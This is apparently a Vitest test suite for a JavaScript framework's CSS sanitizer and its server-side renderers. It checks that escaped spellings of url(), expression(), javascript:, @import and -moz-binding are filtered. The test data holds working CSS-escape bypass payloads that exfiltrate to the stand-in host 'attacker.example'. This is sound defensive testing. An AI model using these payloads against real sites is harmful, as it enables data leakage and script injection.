import { describe, expect, it } from "vitest";
import { div } from "../src/core/rendering/html";
import { signal } from "../src/core/signals/signal";
import { renderToDocument, renderToStream, renderToString } from "../src/platform/ssr";
import { sanitizeAttributeString, sanitizeCSSValue, sanitizeStyleAttribute } from "../src/utils/sanitize";

// ---------------------------------------------------------------------------
// One CSS policy, every escape form and every render target.
//
// TWO INVARIANTS UNDER TEST:
//
// 1. A CSS token means the same thing however it is spelled. The CSS escape
//    grammar has THREE productions, and the sanitizer decoded only one:
//
//      hex escape     \75 rl(…)   → decoded  ✓
//      simple escape  u\rl(…)     → NOT decoded  ✗   (\ + any non-hex char
//                                                     is literally that char)
//      escaped newline  u\<LF>rl(…)  → NOT decoded  ✗
//
//    A browser resolves all three to `url(`. The sanitizer resolved one, so the
//    other two walked straight through the danger-token scan.
//
// 2. Every render target enforces the same policy. `tagFactory` (client) and
//    `router` sanitize `style`; the three SSR attribute serializers did not, so
//    the identical component was filtered in the browser and emitted verbatim
//    from the server — including into `<body style="…">` via `bodyAttrs`.
//
// NOTE ON TEST DESIGN: payloads use `url(https://…)` / `@import`, constructs a
// real CSS parser preserves, so a passing assertion proves SibuJS filtered them
// rather than the engine having discarded them anyway.
// ---------------------------------------------------------------------------

const EXFIL = "https://attacker.example/?leak=1";

/**
 * Escape spellings that all resolve to the SAME dangerous token in a browser.
 * Written with doubled backslashes so the JS string carries a literal `\`.
 */
const ESCAPE_SPELLINGS: [string, string][] = [
  ["plain", `url(${EXFIL})`],
  ["hex escape", `\\75 rl(${EXFIL})`],
  ["simple escape on u", `\\url(${EXFIL})`],
  ["simple escape on r", `u\\rl(${EXFIL})`],
  ["simple escape on l", `ur\\l(${EXFIL})`],
  ["escaped newline", `u\\\nrl(${EXFIL})`],
  ["escaped CRLF", `u\\\r\nrl(${EXFIL})`],
  ["escaped form feed", `u\\\frl(${EXFIL})`],
  ["multiple simple escapes", `\\u\\r\\l(${EXFIL})`],
];

describe("sanitizeCSSValue: every spelling of a dangerous token is blocked", () => {
  for (const [label, payload] of ESCAPE_SPELLINGS) {
    it(`blocks url() written as ${label}`, () => {
      expect(sanitizeCSSValue(payload)).toBe("");
    });
  }

  it("blocks expression() hidden behind a simple escape", () => {
    expect(sanitizeCSSValue("expressio\\n(alert(1))")).toBe("");
    expect(sanitizeCSSValue("expre\\ssion(alert(1))")).toBe("");
  });

  it("blocks javascript: hidden behind a simple escape", () => {
    expect(sanitizeCSSValue("java\\script:alert(1)")).toBe("");
    expect(sanitizeCSSValue("\\vbscript:alert(1)")).toBe("");
  });

  it("does NOT mistake a hex-digit letter for a simple escape", () => {
    // `\e` and `\a` are HEX escapes (U+000E, U+000A) — not the letters `e`/`a`.
    // A browser resolving `\expression(` sees U+000E followed by `xpression(`,
    // so there is no dangerous token there and the value must survive. Decoding
    // these as simple escapes would reject legitimate CSS.
    expect(sanitizeCSSValue("\\expression(alert(1))")).toBe("\\expression(alert(1))");
    expect(sanitizeCSSValue("j\\avascript:alert(1)")).toBe("j\\avascript:alert(1)");
  });

  it("blocks @import hidden behind a simple escape", () => {
    expect(sanitizeCSSValue("\\@import 'https://attacker.example/x.css'")).toBe("");
    expect(sanitizeCSSValue("@\\import 'https://attacker.example/x.css'")).toBe("");
  });

  it("blocks -moz-binding and behavior: hidden behind simple escapes", () => {
    // No literal `url(` in either payload — otherwise the pre-fix sanitizer
    // would block them for the wrong reason and the test would prove nothing.
    expect(sanitizeCSSValue("-moz-b\\inding: x")).toBe("");
    expect(sanitizeCSSValue("behavi\\or: x")).toBe("");
  });

  it("blocks image-set() hidden behind a simple escape", () => {
    expect(sanitizeCSSValue(`image-se\\t(${EXFIL})`)).toBe("");
  });
});

describe("sanitizeCSSValue: safe values survive unchanged", () => {
  const SAFE = [
    "red",
    "14px",
    "#fff",
    "1px solid black",
    "flex",
    "calc(100% - 10px)",
    "rgba(0, 0, 0, 0.5)",
    "translateX(10px) rotate(45deg)",
    "var(--brand, #333)",
    // A legitimate CSS escape in generated content: U+201C.
    '"\\201C"',
    // Simple escapes are legal in identifiers; these resolve to harmless words.
    "\\red",
    "linear-gradient(to right, #fff, #000)",
  ];

  for (const value of SAFE) {
    it(`returns ${JSON.stringify(value)} verbatim`, () => {
      // Decoding is for INSPECTION only — the caller's original text is what
      // reaches CSS, so escapes the author wrote must not be rewritten.
      expect(sanitizeCSSValue(value)).toBe(value);
    });
  }
});

describe("escape-aware policy reaches every style authoring form", () => {
  const PAYLOAD = `u\\rl(${EXFIL})`;

  it("object style", () => {
    const el = div({ style: { background: PAYLOAD } }) as HTMLElement;
    expect(el.getAttribute("style") ?? "").not.toContain("attacker.example");
  });

  it("string style", () => {
    const el = div({ style: `color: red; background: ${PAYLOAD}` }) as HTMLElement;
    const style = el.getAttribute("style") ?? "";
    expect(style).not.toContain("attacker.example");
    expect(style).toContain("red");
  });

  it("reactive style", () => {
    const [style] = signal(`background: ${PAYLOAD}`);
    const el = div({ style: () => style() }) as HTMLElement;
    expect(el.getAttribute("style") ?? "").not.toContain("attacker.example");
  });

  it("sanitizeStyleAttribute", () => {
    expect(sanitizeStyleAttribute(`background: ${PAYLOAD}`)).not.toContain("attacker.example");
  });

  it("sanitizeAttributeString", () => {
    expect(sanitizeAttributeString("style", `background: ${PAYLOAD}`)).not.toContain("attacker.example");
  });
});

// ---------------------------------------------------------------------------
// SSR: the style attribute is sanitized on every serializer.
// ---------------------------------------------------------------------------

/** Build an element carrying a raw `style` attribute the server must filter. */
function styled(styleValue: string): HTMLElement {
  const el = document.createElement("div");
  el.setAttribute("style", styleValue);
  return el;
}

async function collect(stream: AsyncGenerator<string>): Promise<string> {
  let out = "";
  for await (const chunk of stream) out += chunk;
  return out;
}

const SSR_PAYLOADS: [string, string][] = [
  ["plain url()", `background: url(${EXFIL})`],
  ["hex-escaped url()", `background: \\75 rl(${EXFIL})`],
  ["simple-escaped url()", `background: u\\rl(${EXFIL})`],
  ["expression()", "width: expression(alert(1))"],
  ["@import", "@import 'https://attacker.example/x.css'"],
  ["-moz-binding", "-moz-binding: url(https://attacker.example/x.xml#e)"],
];

describe("renderToString sanitizes the style attribute", () => {
  for (const [label, payload] of SSR_PAYLOADS) {
    it(`filters ${label}`, () => {
      const html = renderToString(styled(payload));
      expect(html).not.toContain("attacker.example");
      expect(html).not.toContain("expression(");
    });
  }

  it("keeps the safe declarations of a mixed list", () => {
    const html = renderToString(styled(`color: red; background: url(${EXFIL})`));
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("red");
  });

  it("leaves an entirely safe style attribute intact", () => {
    const html = renderToString(styled("color: red; font-weight: bold"));
    expect(html).toContain("color");
    expect(html).toContain("red");
    expect(html).toContain("bold");
  });

  it("still HTML-escapes quotes in a surviving style value", () => {
    // Sanitization must run BEFORE escaping: a sanitizer that re-serializes
    // after `escapeAttr` would emit raw `"` back into the attribute.
    const html = renderToString(styled('font-family: "My Font", serif'));
    const style = html.match(/style="([^"]*)"/)?.[1] ?? "";
    expect(style).toContain("&quot;");
    expect(style).toContain("My Font");
  });
});

describe("renderToStream sanitizes the style attribute", () => {
  for (const [label, payload] of SSR_PAYLOADS) {
    it(`filters ${label}`, async () => {
      const html = await collect(renderToStream(styled(payload)));
      expect(html).not.toContain("attacker.example");
      expect(html).not.toContain("expression(");
    });
  }

  it("agrees with renderToString on a mixed list", async () => {
    const payload = `color: red; background: url(${EXFIL})`;
    const streamed = await collect(renderToStream(styled(payload)));
    const stringified = renderToString(styled(payload));
    const styleOf = (html: string) => html.match(/style="([^"]*)"/)?.[1] ?? "";
    expect(styleOf(streamed)).toBe(styleOf(stringified));
  });
});

describe("renderToDocument sanitizes style in bodyAttrs", () => {
  for (const [label, payload] of SSR_PAYLOADS) {
    it(`filters ${label}`, () => {
      const html = renderToDocument(() => document.createElement("div"), {
        bodyAttrs: { style: payload },
      });
      expect(html).not.toContain("attacker.example");
      expect(html).not.toContain("expression(");
    });
  }

  it("filters style on meta and link entries", () => {
    const html = renderToDocument(() => document.createElement("div"), {
      meta: [{ name: "description", content: "ok", style: `background: url(${EXFIL})` }],
      links: [{ rel: "stylesheet", href: "/app.css", style: `background: url(${EXFIL})` }],
    });
    expect(html).not.toContain("attacker.example");
  });

  it("keeps a safe bodyAttrs style", () => {
    const html = renderToDocument(() => document.createElement("div"), {
      bodyAttrs: { style: "margin: 0" },
    });
    expect(html).toContain("margin");
  });
});

describe("SSR and client agree on style policy", () => {
  for (const [, payload] of SSR_PAYLOADS) {
    it(`same verdict for ${JSON.stringify(payload).slice(0, 40)}`, () => {
      const client = (div({ style: payload }) as HTMLElement).getAttribute("style") ?? "";
      const server = renderToString(styled(payload)).match(/style="([^"]*)"/)?.[1] ?? "";
      const dangerous = (s: string) => s.includes("attacker.example") || s.includes("expression(");
      expect(dangerous(server)).toBe(dangerous(client));
    });
  }
});
